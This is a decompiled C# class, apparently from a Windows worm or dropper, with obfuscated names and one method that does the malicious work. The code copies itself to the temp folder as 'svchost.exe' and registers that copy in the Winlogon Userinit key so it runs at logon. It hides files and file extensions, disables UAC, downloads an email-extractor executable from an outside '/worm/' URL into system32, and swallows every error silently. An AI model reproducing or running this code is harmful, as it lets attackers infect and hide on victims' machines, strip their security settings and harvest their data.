using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns1;

namespace ns2;

internal sealed class Class9
{
	public static void smethod_0()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Path.GetTempPath() + "svchost.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", (object)("C:\\WINDOWS\\SYSTEM32\\Userinit.exe," + Path.GetTempPath() + "svchost.exe"));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"2");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)"0");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Network().DownloadFile("http://mh-2.gnet.ba/worm/emailextractor.exe", "C:\\WINDOWS\\system32\\extract.exe");
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Network().DownloadFile("" + Class2.smethod_2().method_0().vmethod_19()
				.get_Text(), "C:\\WINDOWS\\system32\\logstm.txt");
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		((ServerComputer)Class2.smethod_0()).get_Network().DownloadFile("" + Class2.smethod_2().method_0().vmethod_43()
			.get_Text(), "C:\\WINDOWS\\system32\\logstm123.txt");
	}
}
